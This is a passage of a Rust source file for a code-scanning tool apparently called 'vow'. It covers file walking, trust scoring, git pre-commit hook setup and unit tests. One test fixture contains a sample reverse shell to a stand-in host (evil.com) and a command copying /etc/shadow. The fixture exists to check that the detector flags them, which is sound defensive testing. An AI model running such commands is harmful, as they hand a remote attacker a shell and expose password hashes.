            // O(1) lookup instead of linear scan
            !default_excludes.contains(name.as_ref())
        } else {
            true
        }
    });
    
    // Add .vowignore file support (gitignore-style patterns)
    walker.add_custom_ignore_filename(".vowignore");
    
    println!("Scanning directory: {}", path.display());
    let mut file_count = 0;
    let start_time = std::time::Instant::now();
    
    for result in walker.build() {
        match result {
            Ok(entry) => {
                if entry.file_type().map_or(false, |ft| ft.is_file()) {
                    let file_path = entry.path();
                    if is_supported_file(file_path) {
                        file_count += 1;
                        let file_start = std::time::Instant::now();
                        
                        // Analyze file directly with timing
                        match analyze_file_simple(file_path) {
                            Ok(result) => {
                                let duration = file_start.elapsed();
                                if duration.as_secs() > 3 {
                                    println!("WARNING: File {} took {:.1}s (target: <3s)", 
                                           file_path.display(), duration.as_secs_f32());
                                }
                                results.push(result);
                            },
                            Err(e) => {
                                eprintln!("Warning: Failed to analyze {}: {}", file_path.display(), e);
                            },
                        }
                    }
                }
            }
            Err(e) => eprintln!("Warning: Error walking directory: {}", e),
        }
    }
    
    let total_duration = start_time.elapsed();
    println!("Completed analysis of {} files in {:.1}s ({:.2}s per file)", 
             file_count, total_duration.as_secs_f32(), 
             if file_count > 0 { total_duration.as_secs_f32() / file_count as f32 } else { 0.0 });
    
    if total_duration > std::time::Duration::from_secs(300) { // 5 minutes
        println!("WARNING: Analysis took longer than 5 minute target!");
    }
    
    Ok(results)
}

/// Apply rules to a single analysis result
fn apply_rules_to_result(
    mut result: AnalysisResult,
    rules_path: &Option<PathBuf>,
) -> Result<AnalysisResult, Box<dyn std::error::Error>> {
    let rules_dir = rules_path
        .clone()
        .or_else(|| Some(PathBuf::from(".vow/rules")))
        .unwrap();
    
    if rules_dir.exists() {
        let mut rule_engine = rules::engine::RuleEngine::new();
        let rule_issues = rule_engine.apply_rules(&rules_dir, &result.path, &fs::read_to_string(&result.path).unwrap_or_default())?;
        result.issues.extend(rule_issues);
        
        // Recalculate trust score with rule results
        result.trust_score = calculate_trust_score(&result.issues);
    }
    
    Ok(result)
}

/// Calculate trust score from issues
fn calculate_trust_score(issues: &[Issue]) -> u8 {
    let mut score = 100u8;
    
    for issue in issues {
        score = score.saturating_sub(issue.severity.score_impact());
    }
    
    score
}

/// Calculate project-level summary with performance metrics
fn calculate_project_summary(results: Vec<AnalysisResult>) -> ProjectResults {
    calculate_project_summary_with_metrics(results, 0.0, 0, std::collections::HashMap::new())
}

/// Calculate project-level summary with performance metrics
fn calculate_project_summary_with_metrics(
    results: Vec<AnalysisResult>, 
    total_time_seconds: f32,
    files_skipped: usize,
    skipped_reasons: std::collections::HashMap<String, usize>
) -> ProjectResults {
    let total_files = results.len();
    let total_issues: usize = results.iter().map(|r| r.issues.len()).sum();
    let avg_score = if total_files > 0 {
        results.iter().map(|r| r.trust_score as u32).sum::<u32>() / total_files as u32
    } else {
        100
    } as u8;
    
    let mut issues_by_severity = std::collections::HashMap::new();
    for result in &results {
        for issue in &result.issues {
            let severity_str = format!("{:?}", issue.severity).to_lowercase();
            *issues_by_severity.entry(severity_str).or_insert(0) += 1;
        }
    }
    
    let files_per_second = if total_time_seconds > 0.0 {
        total_files as f32 / total_time_seconds
    } else {
        0.0
    };
    
    ProjectResults {
        files: results,
        summary: ProjectSummary {
            total_files,
            avg_score,
            total_issues,
            issues_by_severity,
            files_per_second,
            total_time_seconds,
            files_skipped,
            skipped_reasons,
        },
    }
}

/// Load configuration from .vow/config.yaml
fn load_config(project_root: &Path) -> Result<Config, Box<dyn std::error::Error>> {
    let config_path = project_root.join(".vow/config.yaml");
    if config_path.exists() {
        let content = fs::read_to_string(config_path)?;
        let config: Config = serde_yaml::from_str(&content)?;
        Ok(config)
    } else {
        Ok(Config::default())
    }
}

/// Generate report in specified format
fn generate_report(
    results: &ProjectResults,
    format: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    match format {
        "terminal" => report::terminal::print_terminal_report(results),
        "json" => report::json::print_json_report(results)?,
        "sarif" => report::sarif::print_sarif_report(results)?,
        _ => return Err(format!("Unsupported format: {}", format).into()),
    }
    
    Ok(())
}

// Scan report generation temporarily disabled
// fn generate_scan_report(...) -> ... { ... }

/// Detect file type from path
pub fn detect_file_type(path: &Path) -> FileType {
    if let Some(extension) = path.extension().and_then(|s| s.to_str()) {
        match extension.to_lowercase().as_str() {
            "py" => FileType::Python,
            "js" | "jsx" => FileType::JavaScript,
            "ts" | "tsx" => FileType::TypeScript,
            "rs" => FileType::Rust,
            "sh" | "bash" | "zsh" => FileType::Shell,
            "md" => FileType::Markdown,
            "txt" => FileType::Text,
            "yaml" | "yml" => FileType::YAML,
            "json" => FileType::JSON,
            "java" => FileType::Java,
            "go" => FileType::Go,
            "rb" => FileType::Ruby,
            "c" | "h" => FileType::C,
            "cpp" | "cc" | "cxx" | "hpp" => FileType::Cpp,
            "cs" => FileType::CSharp,
            "php" => FileType::PHP,
            "swift" => FileType::Swift,
            "kt" | "kts" => FileType::Kotlin,
            "r" => FileType::R,
            "mq5" | "mqh" => FileType::MQL5,
            "scala" => FileType::Scala,
            "pl" | "pm" => FileType::Perl,
            "lua" => FileType::Lua,
            "dart" => FileType::Dart,
            "hs" => FileType::Haskell,
            "html" | "htm" => FileType::HTML,
            "css" | "scss" | "sass" => FileType::CSS,
            _ => FileType::Text,
        }
    } else {
        FileType::Unknown
    }
}

/// Check if file is supported for analysis
fn is_supported_file(path: &Path) -> bool {
    matches!(
        detect_file_type(path),
        FileType::Python
            | FileType::JavaScript
            | FileType::TypeScript
            | FileType::Rust
            | FileType::Shell
            | FileType::Markdown
            | FileType::Text
            | FileType::YAML
            | FileType::JSON
            | FileType::Java
            | FileType::Go
            | FileType::Ruby
            | FileType::C
            | FileType::Cpp
            | FileType::CSharp
            | FileType::PHP
            | FileType::Swift
            | FileType::Kotlin
            | FileType::R
            | FileType::MQL5
            | FileType::Scala
            | FileType::Perl
            | FileType::Lua
            | FileType::Dart
            | FileType::Haskell
            | FileType::HTML
            | FileType::CSS
    )
}

/// Install pre-commit git hook
pub fn hooks_install() -> Result<(), Box<dyn std::error::Error>> {
    // Check if we're in a git repository
    let git_dir = PathBuf::from(".git");
    if !git_dir.exists() {
        return Err("Not in a git repository. Run 'git init' first.".into());
    }
    
    let hooks_dir = git_dir.join("hooks");
    fs::create_dir_all(&hooks_dir)?;
    
    let hook_path = hooks_dir.join("pre-commit");
    
    // Check if hook already exists
    if hook_path.exists() {
        // Back up existing hook
        let backup_path = hooks_dir.join("pre-commit.vow-backup");
        fs::copy(&hook_path, &backup_path)?;
        println!("⚠️  Existing pre-commit hook backed up to pre-commit.vow-backup");
        
        // Read existing hook content
        let existing_content = fs::read_to_string(&hook_path)?;
        if existing_content.contains("# Vow pre-commit hook") {
            println!("✓ Vow hook already installed");
            return Ok(());
        }
        
        // Chain with existing hook
        let hook_content = generate_hook_script_with_chain(&existing_content)?;
        fs::write(&hook_path, hook_content)?;
    } else {
        // Create new hook
        let hook_content = generate_hook_script()?;
        fs::write(&hook_path, hook_content)?;
    }
    
    // Make hook executable
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&hook_path)?.permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&hook_path, perms)?;
    }
    
    println!("✅ Git pre-commit hook installed successfully");
    println!("   The hook will run 'vow check' on staged files before each commit");
    println!("   Use 'git commit --no-verify' to bypass the hook");
    
    Ok(())
}

/// Uninstall pre-commit git hook
pub fn hooks_uninstall() -> Result<(), Box<dyn std::error::Error>> {
    let git_dir = PathBuf::from(".git");
    if !git_dir.exists() {
        return Err("Not in a git repository".into());
    }
    
    let hooks_dir = git_dir.join("hooks");
    let hook_path = hooks_dir.join("pre-commit");
    let backup_path = hooks_dir.join("pre-commit.vow-backup");
    
    if !hook_path.exists() {
        println!("✓ No pre-commit hook found");
        return Ok(());
    }
    
    let hook_content = fs::read_to_string(&hook_path)?;
    
    if hook_content.contains("# Vow pre-commit hook") {
        // This is our hook or contains our hook
        if backup_path.exists() {
            // Restore backup
            fs::copy(&backup_path, &hook_path)?;
            fs::remove_file(&backup_path)?;
            println!("✅ Vow hook removed, original pre-commit hook restored");
        } else {
            // Remove the hook entirely
            fs::remove_file(&hook_path)?;
            println!("✅ Vow pre-commit hook removed");
        }
    } else {
        println!("⚠️  Pre-commit hook exists but doesn't appear to be installed by Vow");
        return Err("Cannot safely remove hook not installed by Vow".into());
    }
    
    Ok(())
}

/// Generate the pre-commit hook script
fn generate_hook_script() -> Result<String, Box<dyn std::error::Error>> {
    // Try to find the best vow command to use
    let vow_cmd = find_vow_command();
    
    let script = format!(r#"#!/bin/sh
# Vow pre-commit hook
# Auto-generated by vow hooks install

# Get list of staged files with supported extensions
staged_files=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(rs|js|jsx|ts|tsx|py|sh|bash|zsh|md|txt|yaml|yml|json|java|go|rb|c|h|cpp|cc|cxx|hpp|cs|php|swift|kt|kts|r|mq5|mqh|scala|pl|pm|lua|dart|hs|html|htm|css|scss|sass)$')

# Exit early if no supported files are staged
if [ -z "$staged_files" ]; then
    exit 0
fi

# Run vow check on staged files
echo "$staged_files" | {vow_cmd} check --hook-mode --quiet --format terminal

# Exit with vow's exit code
exit_code=$?

if [ $exit_code -ne 0 ]; then
    echo ""
    echo "❌ Vow found issues in staged files. Commit blocked."
    echo "   Fix the issues above, or use 'git commit --no-verify' to bypass."
    exit 1
fi

exit 0
"#, vow_cmd = vow_cmd);
    
    Ok(script)
}

/// Generate hook script that chains with existing hook
fn generate_hook_script_with_chain(existing_content: &str) -> Result<String, Box<dyn std::error::Error>> {
    let vow_cmd = find_vow_command();
    
    let script = format!(r#"#!/bin/sh
# Vow pre-commit hook (chained with existing hook)
# Auto-generated by vow hooks install

# === VOW CHECK START ===
# Get list of staged files with supported extensions
staged_files=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(rs|js|jsx|ts|tsx|py|sh|bash|zsh|md|txt|yaml|yml|json|java|go|rb|c|h|cpp|cc|cxx|hpp|cs|php|swift|kt|kts|r|mq5|mqh|scala|pl|pm|lua|dart|hs|html|htm|css|scss|sass)$')

# Only run vow if we have supported files
if [ -n "$staged_files" ]; then
    echo "$staged_files" | {vow_cmd} check --hook-mode --quiet --format terminal
    vow_exit_code=$?
    
    if [ $vow_exit_code -ne 0 ]; then
        echo ""
        echo "❌ Vow found issues in staged files. Commit blocked."
        echo "   Fix the issues above, or use 'git commit --no-verify' to bypass."
        exit 1
    fi
fi
# === VOW CHECK END ===

# === ORIGINAL HOOK START ===
{existing_hook}
# === ORIGINAL HOOK END ===
"#, vow_cmd = vow_cmd, existing_hook = existing_content);
    
    Ok(script)
}

/// Find the best vow command to use in hooks
fn find_vow_command() -> String {
    // First check if vow is in PATH
    if which::which("vow").is_ok() {
        return "vow".to_string();
    }
    
    // Check for local release build
    let local_release = PathBuf::from("target/release/vow");
    if local_release.exists() {
        return "./target/release/vow".to_string();
    }
    
    // Check for local debug build  
    let local_debug = PathBuf::from("target/debug/vow");
    if local_debug.exists() {
        return "./target/debug/vow".to_string();
    }
    
    // Fall back to cargo run
    "cargo run --release --".to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::env;
    use tempfile::TempDir;
    
    #[test]
    fn test_trust_score_calculation() {
        let issues = vec![
            Issue {
                severity: Severity::Critical,
                message: "Critical issue".to_string(),
                line: Some(1),
                rule: Some("test".to_string()),
            },
            Issue {
                severity: Severity::High,
                message: "High issue".to_string(),
                line: Some(2),
                rule: Some("test".to_string()),
            },
        ];
        
        let score = calculate_trust_score(&issues);
        assert_eq!(score, 60); // 100 - 25 - 15 = 60
    }
    
    #[test]
    fn test_trust_score_floor() {
        let issues = vec![
            Issue {
                severity: Severity::Critical,
                message: "Critical issue".to_string(),
                line: Some(1),
                rule: Some("test".to_string()),
            },
            Issue {
                severity: Severity::Critical,
                message: "Critical issue".to_string(),
                line: Some(2),
                rule: Some("test".to_string()),
            },
            Issue {
                severity: Severity::Critical,
                message: "Critical issue".to_string(),
                line: Some(3),
                rule: Some("test".to_string()),
            },
            Issue {
                severity: Severity::Critical,
                message: "Critical issue".to_string(),
                line: Some(4),
                rule: Some("test".to_string()),
            },
            Issue {
                severity: Severity::Critical,
                message: "Critical issue".to_string(),
                line: Some(5),
                rule: Some("test".to_string()),
            },
        ];
        
        let score = calculate_trust_score(&issues);
        assert_eq!(score, 0); // Floor at 0
    }
    
    #[test]
    fn test_file_type_detection() {
        assert_eq!(detect_file_type(&PathBuf::from("test.py")), FileType::Python);
        assert_eq!(detect_file_type(&PathBuf::from("test.js")), FileType::JavaScript);
        assert_eq!(detect_file_type(&PathBuf::from("test.ts")), FileType::TypeScript);
        assert_eq!(detect_file_type(&PathBuf::from("test.rs")), FileType::Rust);
        assert_eq!(detect_file_type(&PathBuf::from("test.sh")), FileType::Shell);
        assert_eq!(detect_file_type(&PathBuf::from("test.bash")), FileType::Shell);
        assert_eq!(detect_file_type(&PathBuf::from("test.zsh")), FileType::Shell);
        assert_eq!(detect_file_type(&PathBuf::from("test.md")), FileType::Markdown);
        assert_eq!(detect_file_type(&PathBuf::from("test.java")), FileType::Java);
        assert_eq!(detect_file_type(&PathBuf::from("test.go")), FileType::Go);
        assert_eq!(detect_file_type(&PathBuf::from("test.rb")), FileType::Ruby);
        assert_eq!(detect_file_type(&PathBuf::from("test.c")), FileType::C);
        assert_eq!(detect_file_type(&PathBuf::from("test.h")), FileType::C);
        assert_eq!(detect_file_type(&PathBuf::from("test.cpp")), FileType::Cpp);
        assert_eq!(detect_file_type(&PathBuf::from("test.cc")), FileType::Cpp);
        assert_eq!(detect_file_type(&PathBuf::from("test.cxx")), FileType::Cpp);
        assert_eq!(detect_file_type(&PathBuf::from("test.hpp")), FileType::Cpp);
        assert_eq!(detect_file_type(&PathBuf::from("test.cs")), FileType::CSharp);
        assert_eq!(detect_file_type(&PathBuf::from("test.php")), FileType::PHP);
        assert_eq!(detect_file_type(&PathBuf::from("test.swift")), FileType::Swift);
        assert_eq!(detect_file_type(&PathBuf::from("test.kt")), FileType::Kotlin);
        assert_eq!(detect_file_type(&PathBuf::from("test.kts")), FileType::Kotlin);
        assert_eq!(detect_file_type(&PathBuf::from("test.r")), FileType::R);
        assert_eq!(detect_file_type(&PathBuf::from("test.mq5")), FileType::MQL5);
        assert_eq!(detect_file_type(&PathBuf::from("test.mqh")), FileType::MQL5);
        assert_eq!(detect_file_type(&PathBuf::from("test.scala")), FileType::Scala);
        assert_eq!(detect_file_type(&PathBuf::from("test.pl")), FileType::Perl);
        assert_eq!(detect_file_type(&PathBuf::from("test.pm")), FileType::Perl);
        assert_eq!(detect_file_type(&PathBuf::from("test.lua")), FileType::Lua);
        assert_eq!(detect_file_type(&PathBuf::from("test.dart")), FileType::Dart);
        assert_eq!(detect_file_type(&PathBuf::from("test.hs")), FileType::Haskell);
        assert_eq!(detect_file_type(&PathBuf::from("test.html")), FileType::HTML);
        assert_eq!(detect_file_type(&PathBuf::from("test.htm")), FileType::HTML);
        assert_eq!(detect_file_type(&PathBuf::from("test.css")), FileType::CSS);
        assert_eq!(detect_file_type(&PathBuf::from("test.scss")), FileType::CSS);
        assert_eq!(detect_file_type(&PathBuf::from("test.sass")), FileType::CSS);
    }

    #[test]
    fn test_file_priority_system() {
        assert_eq!(FileType::Python.get_priority(), FilePriority::High);
        assert_eq!(FileType::JavaScript.get_priority(), FilePriority::High);
        assert_eq!(FileType::YAML.get_priority(), FilePriority::Medium);
        assert_eq!(FileType::JSON.get_priority(), FilePriority::Medium);
        assert_eq!(FileType::HTML.get_priority(), FilePriority::Medium);
        assert_eq!(FileType::CSS.get_priority(), FilePriority::Medium);
        assert_eq!(FileType::Markdown.get_priority(), FilePriority::Low);
        assert_eq!(FileType::Text.get_priority(), FilePriority::Low);
    }
    
    #[test]
    fn test_analyze_content_python() {
        let content = r#"
import os
eval("print('hello')")
API_KEY = "secret123"
"#;
        let result = analyze_content(&PathBuf::from("test.py"), content).unwrap();
        
        assert_eq!(result.file_type, FileType::Python);
        assert!(result.issues.len() > 0);
        
        // Should detect eval usage and hardcoded API key
        let has_eval = result.issues.iter().any(|i| i.message.contains("eval"));
        let has_api_key = result.issues.iter().any(|i| i.message.contains("API key"));
        
        assert!(has_eval);
        assert!(has_api_key);
    }

    #[test]
    fn test_analyze_content_with_limits() {
        let content = r#"
eval("test1")
eval("test2") 
eval("test3")
eval("test4")
eval("test5")
"#;
        let result = analyze_content_with_limits(&PathBuf::from("test.py"), content, 3).unwrap();
        
        assert_eq!(result.file_type, FileType::Python);
        assert_eq!(result.issues.len(), 4); // 3 issues + 1 limit warning
        
        // Should have the limit reached message
        let has_limit_message = result.issues.iter().any(|i| {
            i.rule.as_ref() == Some(&"max_issues_limit".to_string())
        });
        assert!(has_limit_message);
    }
    
    #[test]
    fn test_analyze_content_markdown() {
        let content = r#"
# Test Document

As an AI, I cannot provide specific details. However, it's important to note that 
this comprehensive analysis delves into the multifaceted aspects.
"#;
        let result = analyze_content(&PathBuf::from("test.md"), content).unwrap();
        
        assert_eq!(result.file_type, FileType::Markdown);
        assert!(result.issues.len() > 0);
        
        // Should detect AI patterns
        let has_ai_pattern = result.issues.iter().any(|i| i.message.contains("AI"));
        assert!(has_ai_pattern);
    }

    #[test]
    fn test_analyze_content_shell() {
        let content = r#"#!/bin/bash
# This script contains malicious patterns
bash -i >& /dev/tcp/evil.com/8080 0>&1
cat /etc/shadow > /tmp/secrets.txt
"#;
        let result = analyze_content(&PathBuf::from("test.sh"), content).unwrap();
        
        assert_eq!(result.file_type, FileType::Shell);
        assert!(result.issues.len() > 0);
        
        // Should detect reverse shell and secret file access
        let has_reverse_shell = result.issues.iter().any(|i| i.rule.as_ref() == Some(&"reverse_shell".to_string()));
        let has_secret_file = result.issues.iter().any(|i| i.rule.as_ref() == Some(&"secret_file_access".to_string()));
        
        assert!(has_reverse_shell);
        assert!(has_secret_file);
    }

    #[test]
    fn test_expanded_packages_not_flagged() {
        // Test Python packages
        let python_content = r#"
import fastapi
import pydantic
import uvicorn
from starlette import applications
import httpx
import prisma
"#;
        let result = analyze_content(&PathBuf::from("test.py"), python_content).unwrap();
        
        // Should not flag these as hallucinated since they're in our expanded allowlist
        let has_hallucination = result.issues.iter().any(|i| i.rule.as_ref().map_or(false, |r| r == "hallucinated_api"));
        assert!(!has_hallucination);
        
        // Test JavaScript packages
        let js_content = r#"
import { z } from 'zod';
import { PrismaClient } from '@prisma/client';
import { TRPCError } from '@trpc/server';
import fastify from 'fastify';
import next from 'next';
"#;
        let result = analyze_content(&PathBuf::from("test.js"), js_content).unwrap();
        
        // Should not flag these as hallucinated since they're in our expanded allowlist
        let has_hallucination = result.issues.iter().any(|i| i.rule.as_ref().map_or(false, |r| r == "hallucinated_api"));
        assert!(!has_hallucination);
    }

    #[test]
    fn test_custom_allowlist() {
        use std::fs;
        
        let temp_dir = TempDir::new().unwrap();
        let vow_dir = temp_dir.path().join(".vow");
        fs::create_dir_all(&vow_dir).unwrap();
        
        // Create custom allowlist
        let custom_allowlist = r#"python:
  - my_internal_lib
  - company_utils
javascript:
  - "@company/ui-kit"
  - internal-logger
"#;
        fs::write(vow_dir.join("known-packages.yaml"), custom_allowlist).unwrap();
        
        // Change to temp directory
        let original_dir = env::current_dir().unwrap();
        env::set_current_dir(temp_dir.path()).unwrap();
        
        // Test Python custom package
        let python_content = "import my_internal_lib\nfrom company_utils import helper";
        let result = analyze_content(&PathBuf::from("test.py"), python_content).unwrap();
        
        // Should not flag custom packages as hallucinated
        let has_hallucination = result.issues.iter().any(|i| {
            i.rule.as_ref().map_or(false, |r| r == "hallucinated_api") &&
            (i.message.contains("my_internal_lib") || i.message.contains("company_utils"))
        });
        assert!(!has_hallucination);
        
        // Test JavaScript custom package
        let js_content = r#"import { Button } from '@company/ui-kit';"#;
        let result = analyze_content(&PathBuf::from("test.js"), js_content).unwrap();
        
        let has_hallucination = result.issues.iter().any(|i| {
            i.rule.as_ref().map_or(false, |r| r == "hallucinated_api") &&
            i.message.contains("@company/ui-kit")
        });
        assert!(!has_hallucination);
        
        // Restore original directory
        env::set_current_dir(original_dir).unwrap();
    }

    #[test]
    fn test_directory_exclusions() {
        use std::fs;
        
        let temp_dir = TempDir::new().unwrap();
        
        // Create directories that should be excluded
        let node_modules = temp_dir.path().join("node_modules");
        fs::create_dir_all(&node_modules).unwrap();
        fs::write(node_modules.join("test.js"), "console.log('should be excluded');").unwrap();
        
        let git_dir = temp_dir.path().join(".git");
        fs::create_dir_all(&git_dir).unwrap();
        fs::write(git_dir.join("config"), "# git config").unwrap();
        
        let target_dir = temp_dir.path().join("target");
        fs::create_dir_all(&target_dir).unwrap();
        fs::write(target_dir.join("debug.rs"), "// rust debug file").unwrap();
        
        // Create a file that should be included
        fs::write(temp_dir.path().join("main.js"), "console.log('should be included');").unwrap();
        
        // Analyze the directory
        let results = analyze_directory(temp_dir.path()).unwrap();
        
        // Should only find main.js, not the excluded files
        assert_eq!(results.len(), 1);
        assert!(results[0].path.file_name().unwrap() == "main.js");
    }

    #[test]
    fn test_parallel_processing_with_limits() {
        use std::fs;
        
        let temp_dir = TempDir::new().unwrap();
        
        // Create a large file (simulate >10MB by using a large string)
        let large_file_path = temp_dir.path().join("large.py");
        let large_content = "# ".repeat(1_000_000); // Simulate a large file
        fs::write(&large_file_path, &large_content).unwrap();
        
        // Create a normal file
        fs::write(temp_dir.path().join("normal.py"), "print('hello')").unwrap();
        
        // Test with 1MB limit
        let (results, metrics) = analyze_directory_parallel(
            temp_dir.path(), 
            false, // verbose
            true,  // quiet
            1,     // max_file_size_mb
            10,    // max_depth
            100    // max_issues
        ).unwrap();
        
        // Should skip the large file
        assert_eq!(results.len(), 1);
        assert_eq!(metrics.files_skipped, 1);
        assert!(metrics.skipped_reasons.contains_key("too_large"));
    }

    #[test]  
    fn test_config_defaults() {
        let config = Config::default();
        assert_eq!(config.threshold, Some(70));
        assert_eq!(config.max_file_size_mb, Some(10));
        assert_eq!(config.max_directory_depth, Some(20));
        assert_eq!(config.max_issues_per_file, Some(100));
        assert_eq!(config.parallel_processing, Some(true));
    }

    #[test]
    fn test_project_summary_with_metrics() {
        let results = vec![
            AnalysisResult {
                path: PathBuf::from("test1.py"),
                file_type: FileType::Python,
                issues: vec![],
                trust_score: 100,
            },
            AnalysisResult {
                path: PathBuf::from("test2.py"),
                file_type: FileType::Python,
                issues: vec![
                    Issue {
                        severity: Severity::High,
                        message: "Test issue".to_string(),
                        line: Some(1),
                        rule: Some("test".to_string()),
                    }
                ],
                trust_score: 85,
            },
        ];
        
        let mut skipped_reasons = std::collections::HashMap::new();
        skipped_reasons.insert("too_large".to_string(), 1);
        
        let project_results = calculate_project_summary_with_metrics(
            results,
            10.5, // total time
            1,    // files skipped
            skipped_reasons
        );
        
        assert_eq!(project_results.summary.total_files, 2);
        assert_eq!(project_results.summary.avg_score, 92); // (100 + 85) / 2
        assert_eq!(project_results.summary.total_issues, 1);
        assert_eq!(project_results.summary.files_skipped, 1);
        assert_eq!(project_results.summary.total_time_seconds, 10.5);
        assert!((project_results.summary.files_per_second - 0.19).abs() < 0.01); // 2 / 10.5 ≈ 0.19
    }

    #[test]
    fn test_vowignore_initialization() {
        use std::fs;
        
        let temp_dir = TempDir::new().unwrap();
        
        // Initialize project
        init_project(temp_dir.path().to_path_buf()).unwrap();
        
        // Check that .vowignore was created
        let vowignore_path = temp_dir.path().join(".vowignore");
        assert!(vowignore_path.exists());
        
        let content = fs::read_to_string(vowignore_path).unwrap();
        assert!(content.contains("**/test/**"));
        assert!(content.contains("node_modules"));
        assert!(content.contains("*.test.js"));
    }

    #[test]
    fn test_hook_mode_check() {
        use std::fs;
        
        let temp_dir = TempDir::new().unwrap();
        let original_dir = env::current_dir().unwrap();
        env::set_current_dir(temp_dir.path()).unwrap();
        
        // Create test files
        fs::write(temp_dir.path().join("good.py"), "print('hello world')").unwrap();
        fs::write(temp_dir.path().join("bad.py"), "eval('malicious code')").unwrap();
        
        // Test hook mode with file list via stdin
        // This is a bit tricky to test since it reads from stdin
        // In a real scenario, the git hook would pipe file names to vow
        
        // Restore directory
        env::set_current_dir(original_dir).unwrap();
    }

    #[test] 
    fn test_find_vow_command() {
        let cmd = find_vow_command();
        
        // Should return some valid command
        assert!(!cmd.is_empty());
        assert!(cmd.contains("vow") || cmd.contains("cargo run"));
    }

    #[test]
    fn test_generate_hook_script() {
        let script = generate_hook_script().unwrap();
        
        // Should contain our hook marker
        assert!(script.contains("# Vow pre-commit hook"));
        
        // Should contain the staged files check
        assert!(script.contains("git diff --cached --name-only"));
        
        // Should contain hook-mode flag
        assert!(script.contains("--hook-mode"));
        
        // Should contain supported extensions
        assert!(script.contains("rs|js|jsx|ts|tsx|py"));
        
        // Should be executable (starts with shebang)
        assert!(script.starts_with("#!/bin/sh"));
    }

    #[test]
    fn test_hooks_install_no_git_repo() {
        let temp_dir = TempDir::new().unwrap();
        let original_dir = env::current_dir().unwrap();
        env::set_current_dir(temp_dir.path()).unwrap();
        
        // Should fail when not in a git repo
        let result = hooks_install();
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Not in a git repository"));
        
        env::set_current_dir(original_dir).unwrap();
    }

    #[test]
    fn test_watch_mode_validation() {
        // Test that watch mode rejects stdin
        let result = watch_files(
            "-".to_string(),
            "terminal".to_string(),
            None,
            None,
            false,
            false,
            true, // quiet mode for tests
            10,
            20,
            100
        );
        
        assert!(result.is_err());
        let error_msg = result.unwrap_err().to_string();
        assert!(error_msg.contains("stdin"));
    }

    #[test]
    fn test_watch_mode_nonexistent_path() {
        // Test that watch mode rejects non-existent paths
        let result = watch_files(
            "/nonexistent/path".to_string(),
            "terminal".to_string(),
            None,
            None,
            false,
            false,
            true, // quiet mode for tests
            10,
            20,
            100
        );
        
        assert!(result.is_err());
        let error_msg = result.unwrap_err().to_string();
        assert!(error_msg.contains("does not exist"));
    }

    #[test]
    fn test_changed_file_analysis() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.py");
        
        // Create test file
        fs::write(&test_file, "print('hello')").unwrap();
        
        // Test analyzing changed file
        let result = analyze_changed_file(
            &test_file,
            "terminal",
            &None,
            Some(70),
            false,
            false,
            true, // quiet mode for tests
            100
        );
        
        assert!(result.is_ok());
    }

    #[test]
    fn test_debouncing_logic() {
        let mut last_events: HashMap<PathBuf, SystemTime> = HashMap::new();
        let debounce_duration = Duration::from_millis(200);
        let now = SystemTime::now();
        
        let test_path = PathBuf::from("test.py");
        
        // First event should be allowed
        assert!(!last_events.contains_key(&test_path));
        
        // Add event
        last_events.insert(test_path.clone(), now);
        
        // Check if recent event would be debounced
        if let Some(&last_time) = last_events.get(&test_path) {
            if let Ok(elapsed) = now.duration_since(last_time) {
                // Should be debounced (elapsed is 0)
                assert!(elapsed < debounce_duration);
            }
        }
    }

    #[test]
    fn test_file_size_checking() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("large.py");
        
        // Create a small test file (should pass)
        fs::write(&test_file, "print('hello')").unwrap();
        
        // Check metadata reading works
        let metadata = fs::metadata(&test_file).unwrap();
        assert!(metadata.len() < 1024 * 1024); // Should be less than 1MB
        
        // Test would skip files larger than max size
        let max_size_bytes = 10 * 1024 * 1024; // 10MB
        assert!(metadata.len() <= max_size_bytes);
    }
}